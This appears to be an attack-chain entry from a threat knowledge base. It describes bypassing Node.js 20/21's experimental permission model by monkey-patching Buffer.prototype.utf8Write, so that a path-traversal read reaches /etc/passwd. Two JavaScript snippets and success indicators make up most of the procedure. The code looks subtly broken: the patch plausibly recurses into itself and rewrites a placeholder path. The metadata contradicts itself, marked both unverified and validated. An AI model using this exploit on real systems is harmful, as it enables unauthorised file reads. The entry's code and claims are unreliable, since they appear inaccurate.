---
id: ac-nodejs-path-traversal-buffer-patch
tags:
  - path-traversal
  - node-js
  - buffer
  - monkey-patch
  - vulnerability-exploit
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Node.js
submitted: true
complexity: medium
created_at: '2024-10-01'
procedures:
  - '[[procedures/Monkey-Patch-Buffer-Internals-in-Node.js]]'
  - '[[procedures/Exploit-Path-Traversal-with-Malicious-Path-in-Node.js]]'
step_count: 2
techniques:
  - '[[File and Directory Discovery]]'
  - '[[Dynamic Linker Hijacking]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:26:22.141Z'
description: >-
  An attack chain exploiting a path traversal vulnerability in Node.js
  experimental permission model by monkey-patching Buffer internals to bypass
  path sanitization.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
  - '[[Dynamic Linker Hijacking]]'
  - '[[JavaScript]]'
---
# Path Traversal in Node.js via Monkey-Patching Buffer Internals

Multi-stage attack chain demonstrating exploitation of a path traversal vulnerability in Node.js versions 20 and 21 using the experimental permission model. The attack involves monkey-patching the Buffer.prototype.utf8Write method to manipulate path resolution during Buffer creation, allowing access to files outside the intended directory.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Monkey-Patch Buffer Internals] --> B[Exploit with Malicious Path]
    B --> C[Arbitrary File Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses built-in Node.js JavaScript capabilities)

### Target Environment

- Node.js runtime versions 20 or 21 with experimental permission model enabled
- Access to run JavaScript code in the Node.js environment (e.g., via a vulnerable application or REPL)
- Filesystem with target files outside the permitted directory

### Initial Access Requirements

- Code execution within the Node.js process (e.g., via RCE or authenticated access to a Node.js app)
- No specific credentials needed beyond process access
- Local or remote Node.js instance

## Detailed Attack Procedures

### Step 1: Monkey-Patch Buffer Internals
procedure: [[procedures/Monkey-Patch-Buffer-Internals-in-Node.js]]

**Objective**: Override the Buffer.prototype.utf8Write method to intercept and modify the string during UTF-8 encoding, altering the resolved path to enable traversal.

**Instructions**: In the Node.js environment, execute JavaScript code to monkey-patch the Buffer prototype. This modifies the behavior when path.resolve() output is converted to a Buffer.

```javascript
// Monkey-patch Buffer.prototype.utf8Write
Buffer.prototype.utf8Write = function(string, offset, length) {
  // Modify the string to insert traversal (e.g., change to include '../')
  if (string.includes('/resolved/path')) {
    string = string.replace('/resolved/path', '/../../etc/passwd');
  }
  // Call original or custom implementation
  return this.write(string, offset, length, 'utf8');
};
```

**Expected Output**: The patch is applied silently; subsequent Buffer.from() calls on paths will use the modified string.

**Success Indicators**:
- No errors thrown during patch application
- Console log or verification shows modified Buffer content when testing with a sample path

### Step 2: Exploit Path Traversal with Malicious Path
procedure: [[procedures/Exploit-Path-Traversal-with-Malicious-Path-in-Node.js]]

**Objective**: Provide a user-controlled path that triggers path.resolve() and Buffer conversion, leveraging the patch to access unauthorized files like /etc/passwd.

**Instructions**: Use the permission model API with a crafted path (e.g., '../../etc/passwd'). The resolution and Buffer creation will be intercepted by the patch, allowing traversal.

```javascript
const fs = require('fs');
const path = require('path');

// Assume permission model context, e.g., accessing a file
const maliciousPath = '../../etc/passwd';
const resolved = path.resolve('/intended/dir', maliciousPath);
const buffer = Buffer.from(resolved);  // This triggers the patched utf8Write

// Read the file using the manipulated buffer/path
fs.readFileSync(buffer.toString());  // Outputs content of /etc/passwd
```

**Expected Output**: Contents of arbitrary file (e.g., /etc/passwd) are read and displayed, confirming bypass.

**Success Indicators**:
- File contents from outside the directory are retrieved
- No permission denied errors; successful read operation

## Attack Chain Summary

### Key Achievements

1. Successful monkey-patching of Buffer internals to alter path handling
2. Bypassing Node.js experimental permission model's path sanitization
3. Achieving arbitrary file read access on the filesystem

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[File and Directory Discovery]] File and Directory Discovery
- [[Dynamic Linker Hijacking]] Modify Code
- [[JavaScript]] Command and Scripting Interpreter: JavaScript

### MITRE ATT&CK Tactics

- [[Execution]] Execution
- [[Discovery]] Discovery

---
*Last updated: 2024-10-01*
